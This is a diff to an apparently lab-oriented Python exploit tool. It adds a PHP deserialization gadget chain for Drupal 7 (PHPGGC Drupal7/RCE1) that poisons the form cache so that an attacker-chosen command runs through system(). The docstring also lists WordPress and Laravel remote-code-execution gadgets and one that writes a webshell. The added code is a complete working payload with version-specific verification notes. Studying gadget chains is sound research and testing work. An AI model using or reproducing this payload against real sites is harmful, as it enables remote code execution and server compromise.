@@ -79,9 +79,9 @@ def set_shell(name: str) -> None:
 
 def set_gadget(name: str, arg: str = "") -> None:
     """Choose the planted record: 'filecache' (lab gadget, writes a
-    webshell), 'wordpress' (WP core gadget) or 'laravel' (PHPGGC
-    Laravel/RCE9 from the framework's own vendor tree) - the last two
-    run arg via system() from __destruct."""
+    webshell) or a real framework gadget that runs arg via system():
+    'wordpress' (WP core), 'laravel' (PHPGGC Laravel/RCE9) or
+    'drupal' (PHPGGC Drupal7/RCE1 from Drupal core)."""
     global GADGET, WP_ARG
     GADGET, WP_ARG = name, arg
 
@@ -96,6 +96,30 @@ SEP = b":" + b'"'
 
 
 def obj_bytes() -> bytes:
+    if GADGET == "drupal":
+        # PHPGGC Drupal7/RCE1 (7.0.8 <= 7.98), verified against the
+        # shipped Drupal 7.98: SchemaCache::__destruct persists the
+        # forged storage to cache_form, and rebuilding that poisoned
+        # form through /?q=system/ajax runs #process ->
+        # drupal_process_attached -> call_user_func_array($callback)
+        # with $callback = "system". The payload matches phpggc's
+        # output plus #parents (in keysToPersist and storage): 7.98's
+        # form_builder derives #id from #parents on the root element,
+        # and a form that never went through form_builder has no such
+        # key (measured: TypeError at form.inc:1878 without it).
+        arg = WP_ARG.encode()
+        return (b'evil|O:11:"SchemaCache":4:'
+                b'{s:6:"\x00*\x00cid";s:14:"form_DrupalRCE";'
+                b's:6:"\x00*\x00bin";s:10:"cache_form";'
+                b's:16:"\x00*\x00keysToPersist";'
+                b'a:4:{s:8:"#form_id";b:1;s:8:"#process";b:1;'
+                b's:9:"#attached";b:1;s:8:"#parents";b:1;}'
+                b's:10:"\x00*\x00storage";'
+                b'a:4:{s:8:"#form_id";s:9:"DrupalRCE";'
+                b's:8:"#process";a:1:{i:0;s:23:"drupal_process_attached";}'
+                b's:9:"#attached";a:1:{s:6:"system";a:1:{i:0;a:1:{i:0;s:'
+                + str(len(arg)).encode() + SEP + arg + b'";}}}'
+                b's:8:"#parents";a:0:{}}}')
     if GADGET == "laravel":
         # PHPGGC Laravel/RCE9 (5.4.0 <= 9.1.8+; verified against the
         # shipped Laravel 11.57 + Monolog 3.13 with --test-payload):
